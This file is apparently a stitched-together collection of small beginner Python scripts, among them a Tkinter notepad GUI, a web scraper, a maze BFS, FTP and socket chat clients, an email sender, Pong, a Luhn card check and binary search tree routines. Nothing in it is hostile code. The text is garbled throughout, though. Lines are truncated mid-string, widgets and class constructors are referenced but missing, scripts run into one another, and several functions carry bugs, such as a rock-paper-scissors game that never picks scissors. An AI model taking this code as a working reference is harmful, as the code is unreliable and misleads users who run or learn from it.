        self.style.map('TNotebook.Tab', background=
        [('selected', _compcolor), ('active', _ana2color)])
        self.TNotebook1 = ttk.Notebook(top)
        self.TNotebook1.place(relx=0.02, rely=0.02, relheight=0.85
                              , relwidth=0.97)
        self.TNotebook1.configure(width=582)
        self.TNotebook1.configure(takefocus="")
        self.TNotebook1_t0 = Frame(self.TNotebook1)
        self.TNotebook1.add(self.TNotebook1_t0, padding=3)
        self.TNotebook1.tab(0, text="Add", compound="none", underline="-1", )
        self.TNotebook1_t1 = Frame(self.TNotebook1)
        self.TNotebook1.add(self.TNotebook1_t1, padding=3)
        self.TNotebook1.tab(1, text="Display", compound="none", underline="-1", )
        self.TNotebook1_t2 = Frame(self.TNotebook1)
        self.TNotebook1.add(self.TNotebook1_t2, padding=3)
        self.TNotebook1.tab(2, text="Create", compound="none", underline="-1", )
        self.inputNotice = Text(self.TNotebook1_t0)
        self.inputNotice.place(relx=0.02, rely=0.28, relheight=0.64
                               , relwidth=0.68)
        self.inputNotice.configure(background="white")
        self.inputNotice.configure(font="TkTextFont")
        self.inputNotice.configure(selectbackground="
        self.inputNotice.configure(width=396)
        self.inputNotice.configure(wrap=WORD)
        self.inputTitle = Entry(self.TNotebook1_t0)
        self.inputTitle.place(relx=0.09, rely=0.08, height=20, relwidth=0.6)
        self.inputTitle.configure(background="white")
        self.inputTitle.configure(font="TkFixedFont")
        self.inputTitle.configure(selectbackground="
        self.Label1 = Label(self.TNotebook1_t0)
        self.Label1.place(relx=0.02, rely=0.08, height=18, width=29)
        self.Label1.configure(activebackground="
        self.Button2 = Button(self.TNotebook1_t0)
        self.Button2.place(relx=0.74, rely=0.28, height=26, width=50)
        self.Button2.configure(activebackground="
        self.Button3.bind('<Button-1>', lambda e: notepad_support.clear_button(e))
        self.outputNotice = Text(self.TNotebook1_t1)
        self.outputNotice.place(relx=0.02, rely=0.19, relheight=0.76
                                , relwidth=0.6)
        self.outputNotice.configure(background="white")
        self.outputNotice.configure(font="TkTextFont")
        self.outputNotice.configure(selectbackground="
        self.outputNotice.configure(width=346)
        self.outputNotice.configure(wrap=WORD)
        self.inputSearchTitle = Entry(self.TNotebook1_t1)
        self.inputSearchTitle.place(relx=0.09, rely=0.08, height=20
                                    , relwidth=0.51)
        self.inputSearchTitle.configure(background="white")
        self.inputSearchTitle.configure(font="TkFixedFont")
        self.inputSearchTitle.configure(selectbackground="
        self.Label3 = Label(self.TNotebook1_t1)
        self.Label3.place(relx=0.02, rely=0.08, height=18, width=29)
        self.Label3.configure(activebackground="
        self.Button4.bind('<Button-1>', lambda e: notepad_support.next_button(e))
        self.Button5 = Button(self.TNotebook1_t1)
        self.Button5.place(relx=0.69, rely=0.44, height=26, width=55)
        self.Button5.configure(activebackground="
        self.Button7.bind('<Button-1>', lambda e: notepad_support.search_button(e))
        self.Button8 = Button(self.TNotebook1_t1)
        self.Button8.place(relx=0.69, rely=0.56, height=26, width=64)
        self.Button8.configure(activebackground="
        self.Button6 = Button(self.TNotebook1_t2)
        self.Button6.place(relx=0.22, rely=0.25, height=26, width=69)
        self.Button6.configure(activebackground="
        self.Button1.bind('<Button-1>', lambda e: notepad_support.exit_button(e))
        self.errorOutput = Label(top)
        self.errorOutput.place(relx=0.03, rely=0.91, height=18, width=206)
        self.errorOutput.configure(activebackground="
if __name__ == '__main__':
    vp_start_gui()
from urllib.request import urlopen as uReq
from bs4 import BeautifulSoup as soup
my_url = "http://www.cricbuzz.com/"
Client = uReq(my_url)
html_page = Client.read()
Client.close()
soup_page = soup(html_page, "html.parser")
score_box = soup_page.findAll("div", {"class": "cb-col cb-col-25 cb-mtch-blk"})
score_box_len = len(score_box)
print(score_box_len)
for i in range(score_box_len):
    print(score_box[i].a["title"])
    print(score_box[i].a.text)
start = [0, 0]
end = [7, 7]
taken = [
    [1, 0], [1, 1], [1, 2], [1, 3]
]
queue = []
queue.append([start[0], start[1], -1])
visited = []
maze = []
for i in range(8):
    maze.append(['.', '.', '.', '.', '.', '.', '.', '.'])
    visited.append([0, 0, 0, 0, 0, 0, 0, 0])
maze[start[0]][start[1]] = 'S'
maze[end[0]][end[1]] = 'E'
for i in taken:
    maze[i[0]][i[1]] = 'X'
while (len(queue) > 0):
    point = queue.pop(0)
    if end[0] == point[0] and end[1] == point[1]:
        print(point[2] + 1)
        break
    current = point[2] + 1
    if point not in taken and visited[point[0]][point[1]] == 0:
        visited[point[0]][point[1]] = current
        for i in range(point[0], -1, -1):
            if [i, point[1]] in taken:
                break
            if visited[i][point[1]] == 0:
                queue.append([i, point[1], current])
        for i in range(point[0], 8):
            if [i, point[1]] in taken:
                break
            if visited[i][point[1]] == 0:
                queue.append([i, point[1], current])
        for i in range(point[1], -1, -1):
            if [point[0], i] in taken:
                break
            if visited[point[0]][i] == 0:
                queue.append([point[0], i, current])
        for i in range(point[1], 8):
            if [point[0], i] in taken:
                break
            if visited[point[0]][i] == 0:
                queue.append([point[0], i, current])
for i in maze:
    for j in i:
        print(j, end='   ')
from appJar import gui 
p = gui()
p.setSize(300,200)
p.go()def draw_diamond(n):
    if n % 2 != 0:
        k = 1
        while k <= n:
            print(' '*int((n - k)/2)+'*'*k+' '*int((n - k)/2))
            k += 2
        j = 1
        while (n-2*j) >= 1:
            print(' ' *j + '*' * (n-2*j) + ' ' * (j))
            j += 1
    else:
        print('Not an odd number. Can\'t draw a diamond :(')
n = int(input('Enter an odd number: '))
draw_diamond(n)
import json
class JsonParser:
    def convert_json_to_python(self, par_json_file):
        with open(par_json_file) as json_file:
            data_dic = json.load(json_file)
        return data_dic
    def convert_python_to_json(self, par_data_dic, par_json_file=""):
        if par_json_file:
            with open(par_json_file, 'w') as outfile:
                return json.dump(par_data_dic, outfile)
        else:
            return json.dump(par_data_dic)
    def get_json_value(self, par_value, par_json_file):
        data_dic = self.convert_json_to_python(par_json_file)
        return data_dic[par_value]
from appJar import gui 
p = gui()
from ftplib import FTP
ftp = FTP('xxx.xxx.x.x')  
ftp.login(user='username', passwd='password')
ftp.cwd('/Enter the directory here/')
def receive_file(filename='example.txt'):
    with open(filename, 'wb') as out_file:
        ftp.retrbinary('RETR ' + filename, out_file.write, 1024)
        ftp.quit()
def send_file(filename='example.txt'):
    with open(filename, 'rb') as in_file:
        ftp.storbinary('STOR ' + filename, in_file)
        ftp.quit()
def lcm(x, y):
    if x > y:
        greater_number = x
    else:
        greater_number = y
    while(True):
        if((greater_number % x == 0) and (greater_number % y == 0)):
            lcm = greater_number
            break
        greater_number += 1
    return lcm
num_1 = int(input('Enter first number: '))
num_2 = int(input('Enter second number: '))
print('The L.C.M. of '+str(num_1)+' and '+str(num_2)+' is '+str(lcm(num_1,num_2)))from __future__ import print_function
import os
import sqlite3 as lite
import sys
dropbox = os.getenv("dropbox")
dbfile = ("Databases\jarvis.db")
master_db = os.path.join(dropbox, dbfile)
con = None
try:
    con = lite.connect(master_db)
    cur = con.cursor()
    cur.execute('SELECT SQLITE_VERSION()')
    data = cur.fetchone()
    print("SQLite version: %s" % data)
except lite.Error as e:
    print("Error %s:" % e.args[0])
    sys.exit(1)
finally:
    if con:
        con.close()
con = lite.connect(master_db)
cur = con.cursor()
cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
rows = cur.fetchall()
for row in rows:
    print(row)
con = lite.connect(master_db)
cur = con.cursor()
cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
while True:
    row = cur.fetchone()
    if row == None:
        break
    print(row[0])
class Node:
    def __init__(self, data):
        self.data = data
        self.next = None
class Linked_List:
    def __init__(self):
        self.head = None
    def Insert_At_Beginning(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        new_node.next = self.head
        self.head = new_node
    def Add_two_no(self, First, Second):
        prev = None
        temp = None
        carry = 0
        while First is not None or Second is not None:
            first_data = 0 if First is None else First.data
            second_data = 0 if Second is None else Second.data
            Sum = carry+first_data+second_data
            carry = 1 if Sum >= 10 else 0
            Sum = Sum if Sum < 10 else Sum % 10
            temp = Node(Sum)
            if self.head is None:
                self.head = temp
            else:
                prev.next = temp
            prev = temp
            if First is not None:
                First = First.next
            if Second is not None:
                Second = Second.next
        if carry > 0:
            temp.next = Node(carry)
    def Display(self):
        temp = self.head
        while(temp):
            print(temp.data, "->", end=" ")
            temp = temp.next
        print("None")
if __name__ == "__main__":
    First = Linked_List()
    Second = Linked_List()
    First.Insert_At_Beginning(6)
    First.Insert_At_Beginning(4)
    First.Insert_At_Beginning(9)
    Second.Insert_At_Beginning(2)
    Second.Insert_At_Beginning(2)
    print("First Linked List: ")
    First.Display()
    print("Second Linked List: ")
    Second.Display()
    Result = Linked_List()
    Result.Add_two_no(First.head, Second.head)
    print("Final Result: ")
    Result.Display()
import socket
import threading
flag = 0
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hostname = input("Enter your host :: ")
s.connect((hostname, 1023))
nickname = input("Enter your Name :: ")
def recieve():
    while True:
        try:
            msg = s.recv(1024).decode("utf-8")
            if msg == "NICK":
                print("Welcome to Chat room :: ", nickname)
                s.send(bytes(nickname, "utf-8"))
            else:
                print(msg)
        except Exception as error:
            print(f"An Erro occured {error}")
            s.close()
            flag = 1
            break
def Write():
    while True:
        try:
            reply_msg = f"{nickname} :: {input()}"
            s.send(bytes(reply_msg, "utf-8"))
        except Exception as error:
            print(f"An Error Occured while sending message !!!\n error : {error}")
            s.close()
            flag = 1
            break
if flag == 1:
    exit()
recieve_thrd = threading.Thread(target=recieve)
recieve_thrd.start()
write_thrd = threading.Thread(target=Write)
write_thrd.start()
a = 12
b = 0
try:
  c = a/b
  print(c)
  print(d)
except ZeroDivisionError:
  print("Invalid input. Divisor cannot be zero.")
except NameError:
  print('Name of variable not defined.')
a = 5
b = 0
try:
  c = a/b
  print(c)
except ZeroDivisionError:
  print("Invalid input. Divisor cannot be zero.")
finally:
  print('Hope all errors were resolved!!')
try:
  eval('x === x')
except SyntaxError:
  print('Please check your syntax.')
try:
  a = '2' + 2
except TypeError:    
  print('int type cannot be added to str type.') 
try:
  a = int('abc')
except ValueError:
  print('Enter a valid integer literal.')
l = [1,2,3,4]
try:
  print(l[4])
except IndexError:
  print('Index of the sequence is out of range. Indexing in python starts from 0.')
f = open('aaa.txt','w')   
f.close()
try:
  f = open('abc.txt','r')
except FileNotFoundError:
  print('Incorrect file name used') 
finally:
  f.close()
try:
  a = 12/0
  b = '2' + 2
  c = int('abc')
  eval('x===x')
except:
  pass 
finally:
  print('Handled multiples errors at one go with no need of knowing names of the errors.')
a = 8
if a < 18:
  raise Exception('You are legally underage!!!')
else:
  print('All is well, go ahead!!')
import requests
def download(url):
    f = open('file_name.jpg', 'wb')  
    f.write(requests.get(url).content)  
    f.close()
    print("Succesfully Downloaded")
def download_2(url):
    try:
        response = requests.get(url)
    except Exception:
        print('Failed Download!')
    else:
        if response.status_code == 200:
            with open('file_name.jpg', 'wb') as f:
                f.write(requests.get(url).content)
                print("Succesfully Downloaded")
        else:
            print('Failed Download!')
url = 'https://avatars0.githubusercontent.com/u/29729380?s=400&v=4'  
download(url)
import sys
sys.path.append("C:\Code")
import functions as f
area = f.calculate_square_area(10)
area = f.calculate_triangle_area(5,10)
print(area)import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
fro_add="dilipvijjapu@gmail.com"
to_add="vijjapudilip@gmail.com"
message=MIMEMultipart()
message['From']=fro_add
message['To']=",".join(to_add)
message['subject']="Testinf mail"
body='Hai this is dilip ,How are you'
message.attach(MIMEText(body,'plain'))
email=" "
password=" "
mail=smtplib.SMTP('smtp.gmail.com',587)
mail.ehlo()
mail.starttls()
mail.login(email,password)
text=message.as_string()
mail.sendmail(fro_add,to_add,text)
mail.quit()
def findLinear(numbers):  
    a = numbers[1] - numbers[0]
    a1 = numbers[2] - numbers[1]
    if a1 == a:
        b = numbers[0] - a
        return (a, b)
    else:
        print("Sequence is not linear")
sequence = []
first_difference = []
second_difference = []
for i in range(4):  
    term = str(i + 1)
    inp = int(input("Enter term " + term + ": "))
    sequence.append(inp)
for i in range(3):
    gradient = sequence[i + 1] - sequence[i]
    first_difference.append(gradient)
for i in range(2):
    gradient = first_difference[i + 1] - first_difference[i]
    second_difference.append(gradient)
if second_difference[0] == second_difference[1]:  
    a = second_difference[0] / 2
    subs_diff = []
    for i in range(4):
        n = i + 1
        num = a * (n * n)
        subs_diff.append((sequence[i]) - num)
    b, c = findLinear(subs_diff)
    print("Nth term: " + str(a) + "n^2 + " +
          str(b) + "n + " + str(c))  
else:
    print("Sequence is not quadratic")
import sys
try:
    import requests
except ImportError:
    print("Please Install Requests Module With Command 'pip install requests'")
    sys.exit(1)
from time import sleep
url = "https://api.covid19api.com/summary"
visit = requests.get(url).json()
NewConfirmed = visit['Global']['NewConfirmed']
TotalConfirmed = visit['Global']['TotalConfirmed']
NewDeaths = visit['Global']['NewDeaths']
TotalDeaths = visit['Global']['TotalDeaths']
NewRecovered = visit['Global']['NewRecovered']
TotalRecovered = visit['Global']['TotalRecovered']
india = visit['Countries']
name = india[76]['Country']
indiaconfirmed = india[76]['NewConfirmed']
indiatotal = india[76]['TotalConfirmed']
indiaDeaths = india[76]['NewDeaths']
deathstotal = india[76]['TotalDeaths']
indianewr = india[76]['NewRecovered']
totalre = india[76]['TotalRecovered']
DateUpdate = india[76]['Date']
def world():
    print(world)
def indiac():
    print(cases)
print("\nDeveloped By @TheDarkW3b")
def choices():
    print("\n1 - To Know Corona Virus Update Across World")
    print("\n2 - To Know Corona Virus Update In India")
    choice = input("Enter 1 Or 2 :- ")
    if choice == "1":
        world()
        sleep(1)
        choices()
    elif choice == "2":
        indiac()
        sleep(1)
        choices()
    else:
        print("\nYou Have Entered Something Wrong, Please Enter Again")
        choices()
choices()
class Stack:
    def __init__(self):
        self.items = []
    def push(self, item):
        self.items.append(item)
    def pop(self):
        return self.items.pop()
    def is_empty(self):
        return self.items == []
    def peek(self):
        return self.items[-1]
    def display(self):
        return self.items
def is_same(p1, p2):
        if p1 == '(' and p2 == ')':
                return True
        elif p1 == '[' and p2 == ']':
                return True
        elif p1 == '{' and p2 == '}':
                return True
        else:
                return False
def is_balanced(check_string):
        s = Stack()
        index = 0
        is_bal = True
        while index < len(check_string) and is_bal:
                paren = check_string[index]
                if paren in '{[(':
                        s.push(paren)
                else:
                        if s.is_empty():
                                is_bal = False
                        else:
                                top = s.pop()
                                if not is_same(top, paren):
                                        is_bal = False
                index += 1
        if s.is_empty() and is_bal:
                return True
        else:
                return False
print(is_balanced('[((())})]'))
import turtle
from turtle import Turtle
sc = turtle.Screen()
sc.title("Pong game")
sc.bgcolor("white")
sc.setup(width=1000, height=600)
left_pad = turtle.Turtle()
left_pad.speed(0)
left_pad.shape("square")
left_pad.color("black")
left_pad.shapesize(stretch_wid=6, stretch_len=2)
left_pad.penup()
left_pad.goto(-400, 0)
right_pad = turtle.Turtle()
right_pad.speed(0)
right_pad.shape("square")
right_pad.color("black")
right_pad.shapesize(stretch_wid=6, stretch_len=2)
right_pad.penup()
right_pad.goto(400, 0)
hit_ball = turtle.Turtle()
hit_ball.speed(40)
hit_ball.shape("circle")
hit_ball.color("blue")
hit_ball.penup()
hit_ball.goto(0, 0)
hit_ball.dx = 5
hit_ball.dy = -5
sc = turtle.Screen()
sc.title("Pong game")
sc.bgcolor("white")
sc.setup(width=1000, height=600)
left_pad = turtle.Turtle()
left_pad.speed(0)
left_pad.shape("square")
left_pad.color("black")
left_pad.shapesize(stretch_wid=6, stretch_len=2)
left_pad.penup()
left_pad.goto(-400, 0)
right_pad = turtle.Turtle()
right_pad.speed(0)
right_pad.shape("square")
right_pad.color("black")
right_pad.shapesize(stretch_wid=6, stretch_len=2)
right_pad.penup()
right_pad.goto(400, 0)
hit_ball: Turtle = turtle.Turtle()
hit_ball.speed(40)
hit_ball.shape("circle")
hit_ball.color("blue")
hit_ball.penup()
hit_ball.goto(0, 0)
hit_ball.dx = 5
hit_ball.dy = -5
left_player = 0
right_player = 0
sketch = turtle.Turtle()
sketch.speed(0)
sketch.color("blue")
sketch.penup()
sketch.hideturtle()
sketch.goto(0, 260)
sketch.write(
    "Left_player : 0    Right_player: 0", align="center", font=("Courier", 24, "normal")
)
def paddleaup():
    y = left_pad.ycor()
    y += 20
    left_pad.sety(y)
def paddleadown():
    y = left_pad.ycor()
    y -= 20
    left_pad.sety(y)
def paddlebup():
    y = right_pad.ycor()
    y += 20
    right_pad.sety(y)
def paddlebdown():
    y = right_pad.ycor()
    y -= 20
    right_pad.sety(y)
sc.listen()
sc.onkeypress(paddleaup, "e")
sc.onkeypress(paddleadown, "x")
sc.onkeypress(paddlebup, "Up")
sc.onkeypress(paddlebdown, "Down")
while True:
    sc.update()
    hit_ball.setx(hit_ball.xcor() + hit_ball.dx)
    hit_ball.sety(hit_ball.ycor() + hit_ball.dy)
    if hit_ball.ycor() > 280:
        hit_ball.sety(280)
        hit_ball.dy *= -1
    if hit_ball.ycor() < -280:
        hit_ball.sety(-280)
        hit_ball.dy *= -1
    if hit_ball.xcor() > 500:
        hit_ball.goto(0, 0)
        hit_ball.dy *= -1
        left_player += 1
        sketch.clear()
        sketch.write(
            "Left_player : {}    Right_player: {}".format(left_player, right_player),
            align="center",
            font=("Courier", 24, "normal"),
        )
    if hit_ball.xcor() < -500:
        hit_ball.goto(0, 0)
        hit_ball.dy *= -1
        right_player += 1
        sketch.clear()
        sketch.write(
            "Left_player : {}    Right_player: {}".format(left_player, right_player),
            align="center",
            font=("Courier", 24, "normal"),
        )
    if (hit_ball.xcor() > 360 and hit_ball.xcor() < 370) and (
        hit_ball.ycor() < right_pad.ycor() + 40
        and hit_ball.ycor() > right_pad.ycor() - 40
    ):
        hit_ball.setx(360)
        hit_ball.dx *= -1
    if (hit_ball.xcor() < -360 and hit_ball.xcor() > -370) and (
        hit_ball.ycor() < left_pad.ycor() + 40
        and hit_ball.ycor() > left_pad.ycor() - 40
    ):
        hit_ball.setx(-360)
        hit_ball.dx *= -1
def left_rotate(s,val):
        s1 = s[0:val]
        s2 = s[val:]
        return s2+s1
def right_rotate(s,val):
        s1 = s[0:len(s)-val]
        s2 = s[len(s)-val:]
        return s2+s1
def circular_rotate(s):
        s = list(s)
        idx = 0
        mid = len(s)//2
        for i in reversed(range(mid,len(s))):
                s[idx],s[i] = s[i],s[idx]
                idx += 1
        return s
s = 'aditya'
print(''.join(circular_rotate(s)))
maximum = int(input(" Please Enter the Maximum Value : "))
number = 1
while number <= maximum:
    if(number % 2 == 0):
        print("{0}".format(number))
    number = number + 1
for i in range(1,6):
    for j in range(0,i):
        print('*',end = " ")
    for j in range(1,(2*(5-i))+1):
        print(" ",end = "")
print(" ")
for i in range(1,6):
    for j in range(0,(2*(i-1))+1):
        print(" ", end="")
    for j in range(0,6-i):
        print('*',end = " ")
    dec_num = input('Enter the decimal number\n')
print(hex(int(dec_num)))
import tkinter
from time import strftime
top = tkinter.Tk()
top.title('Clock')
top.resizable(0,0)
def time(): 
    string = strftime('%H:%M:%S %p') 
    clockTime.config(text = string) 
    clockTime.after(1000, time)
clockTime = tkinter.Label(top, font = ('calibri', 40, 'bold'), background = 'black', foreground = 'white')
clockTime.pack(anchor = 'center')
time() 
top.mainloop()
def twoSum(nums, target):
    chk_map = {}
    for index, val in enumerate(nums):
        compl = target - val
        if compl in chk_map:
            indices = [chk_map[compl], index]
            print(indices)
            return [indices]
        else:
            chk_map[val] = index
    return False
def selection_sort(nums):
    for i in range(len(nums)):
        lowest_value_index = i
        for j in range(i + 1, len(nums)):
            if nums[j] < nums[lowest_value_index]:
                lowest_value_index = j
        nums[i], nums[lowest_value_index] = nums[lowest_value_index], nums[i]
random_list_of_nums = [12, 8, 3, 20, 11]
selection_sort(random_list_of_nums)
print(random_list_of_nums)
n=input("Enter a number")
n=int(n)
if n%2==0:
    print("Number is even")
else:
    print("Number is odd")
indian=["samosa","kachori","dal","naan"]
pakistani=["nihari","paya","karahi"]
bangladesi=["panta bhat","chorchori","fuchka"]
dish=input("Enter a dish name:")
if dish in indian:
    print(f"{dish} is Indian")
elif dish in pakistani:
    print(f"{dish} is pakistani")
elif dish in bangladesi:
    print(f"{dish} is bangladesi")
else:
    print(f"Based on my limited knowledge, I don't know which cuisine is {dish}")
print("Ternary operator demo")
n=input("Enter a number:")
n=int(n)
message="Number is even" if n%2==0 else "Number is odd"
print(message)	
class CreditCard:
    def __init__(self, card_no):
        self.card_no = card_no
    def company(self):
        comp = None
        if str(self.card_no).startswith('4'):
            comp = 'Visa Card'
        elif str(self.card_no).startswith(('50', '67', '58', '63',)):
            comp = 'Maestro Card'
        elif str(self.card_no).startswith('5'):
            comp = 'Master Card'
        elif str(self.card_no).startswith('37'):
            comp = 'American Express Card'
        elif str(self.card_no).startswith('62'):
            comp = 'Unionpay Card'
        elif str(self.card_no).startswith('6'):
            comp = 'Discover Card'
        elif str(self.card_no).startswith('35'):
            comp = 'JCB Card'
        elif str(self.card_no).startswith('7'):
            comp = 'Gasoline Card'
        return 'Company : ' + comp
    def first_check(self):
        if 13 <= len(self.card_no) <= 19:
            message = "First check : Valid in terms of length."
        else:
            message = "First check : Check Card number once again it must be of 13 or 16 digits long."
        return message
    def validate(self):
        sum_ = 0
        crd_no = self.card_no[::-1]
        for i in range(len(crd_no)):
            if i % 2 == 1:
                double_it = int(crd_no[i]) * 2
                if len(str(double_it)) == 2:
                    sum_ += sum([eval(i) for i in str(double_it)])
                else:
                    sum_ += double_it
            else:
                sum_ += int(crd_no[i])
        if sum_ % 10 == 0:
            response = "Valid Card"
        else:
            response = 'Invalid Card'
        return response
    def checksum(self):
        return '
    def set_card(cls, card_to_check):
        return cls(card_to_check)
card_number = input()
card = CreditCard.set_card(card_number)
print(card.company)
print('Card : ', card.card_no)
print(card.first_check())
print(card.checksum)
print(card.validate())
class Node:
        self.info = info
        self.left = None
        self.right = None
    def __str__(self):
        return str(self.info)
    def __del__(self):
        del self
class BinarySearchTree:
        self.root = None
    def insert(self, val):
    if lower_lim is not None and node.info < lower_lim:
        return False
    if upper_lim is not None and node.info > upper_lim:
        return False
    is_left_bst = True
    is_right_bst = True
    if node.left is not None:
        is_left_bst = is_bst(node.left, lower_lim, node.info)
    if is_left_bst and node.right is not None:
        is_right_bst = is_bst(node.right, node.info, upper_lim)
    return is_left_bst and is_right_bst
def postorder(node):
    if node is None:
        return
    if node.left:
        postorder(node.left)
    if node.right:
        postorder(node.right)
    print(node.info)
def inorder(node):
    if node is None:
        return
    if node.left:
        inorder(node.left)
    print(node.info)
    if node.right:
        inorder(node.right)
def preorder(node):
    if node is None:
        return
    print(node.info)
    if node.left:
        preorder(node.left)
    if node.right:
        preorder(node.right)
def bfs(node):
    queue = []
    if node:
        queue.append(node)
    while queue != []:
        temp = queue.pop(0)
        print(temp.info)
        if temp.left:
            queue.append(temp.left)
        if temp.right:
            queue.append(temp.right)
def preorder_itr(node):
    stack = [node]
    values = []
    while stack != []:
        temp = stack.pop()
        print(temp.info)
        values.append(temp.info)
        if temp.right:
            stack.append(temp.right)
        if temp.left:
            stack.append(temp.left)
    return values
def inorder_itr(node):
    stack = []
    current = node
    while True:
        if current != None:
            stack.append(current)  
            current = current.left
        elif stack != []:
            temp = stack.pop()
            print(temp.info)  
            current = temp.right  
        else:
            break
def postorder_itr(node):
    s1, s2 = [node], []
    while s1 != []:
        temp = s1.pop()
        s2.append(temp)
        if temp.left:
            s1.append(temp.left)
        if temp.right:
            s1.append(temp.right)
    print(*(s2[::-1]))
def bst_frm_pre(pre_list):
    box = Node(pre_list[0])
    if len(pre_list) > 1:
        if len(pre_list) == 2:
            if pre_list[1] > pre_list[0]:
                box.right = Node(pre_list[1])
            else:
                box.left = Node(pre_list[1])
        else:
            all_less = False
            for i in range(1, len(pre_list)):
                if pre_list[i] > pre_list[0]:
                    break
            else:
                all_less = True
            if i != 1:
                box.left = bst_frm_pre(pre_list[1:i])
            if not all_less:
                box.right = bst_frm_pre(pre_list[i:])
    return box
def lca(t_node, c1, c2):
    if c1 == c2:
        return c1
    current = t_node
    while current:
        if c1 < current.info and c2 < current.info:
            current = current.left
        elif c1 > current.info and c2 > current.info:
            current = current.right
        else:
            return current.info
    return -1
def vertical_middle_level(t_node):
    e = (t_node, 0)  
    queue = [e]
    ans = []
    while queue != []:
        temp, level = queue.pop(0)
        if level == 0:
            ans.append(str(temp.info))
        if temp.left:
            queue.append((temp.left, level - 1))
        if temp.right:
            queue.append((temp.right, level + 1))
    return " ".join(ans)
def get_level(n, val):
    c_level = 0
    while n.info != val:
        if val < n.info:
            n = n.left
        elif val > n.info:
            n = n.right
        c_level += 1
        if n is None:
            return -1
    return c_level
def depth(node):
    if node is None:
        return 0
    l_depth, r_depth = 0, 0
    if node.left:
        l_depth = depth(node.left)
    if node.right:
        r_depth = depth(node.right)
    return 1 + max(l_depth, r_depth)
t = BinarySearchTree()
t.insert(10)
t.insert(5)
t.insert(15)
t.insert(3)
t.insert(1)
t.insert(0)
t.insert(2)
t.insert(7)
t.insert(12)
t.insert(18)
t.insert(19)
print(depth(t.root))
from __future__ import print_function
import random
def name_to_number(name):
    if name == "rock":
        name = 0
    elif name == "paper":
        name = 1
    elif name == "scissors":
        name = 2
    return name
def number_to_name(number):
    if number == 0:
        return "rock"
    elif number == 1:
        return "paper"
    elif number == 2:
        return "scissors"
def game(player_choice):
    name = player_choice
    print(name)
    number = name_to_number(name)
    comp_number = random.randrange(0, 2)
    comp_choice = number_to_name(comp_number)
    print(comp_choice)
    comp = -int(comp_number)
    play = int(number)
    diff = (comp + play) % 5
    if diff == 1 or diff == 3:
        print("you won!!!")
    elif diff == 0:
        print("draw")
    elif diff == 2 or diff == 4:
        print("you lose!!!")
import random
class Die(object):
    def __init__(self):
        self.sides = 6
    def set_sides(self, sides_change):
        if sides_change >= 4:
            if sides_change != 6:
                print("change sides from 6 to ", sides_change, " !")
            else:
                print("sides set to 6")
            self.sides = sides_change
        else:
            print("wrong sides! sides set to 6")
    def roll(self):
        return random.randint(1, self.sides)
d = Die()
d1 = Die()
d.set_sides(4)
d1.set_sides(4)
print(d.roll(), d1.roll())
String1 = 'Welcome to Malya\'s World'
print("String with the use of Single Quotes: ") 
print(String1) 
String1 = "I'm a TechGeek"
print("\nString with the use of Double Quotes: ") 
print(String1) 
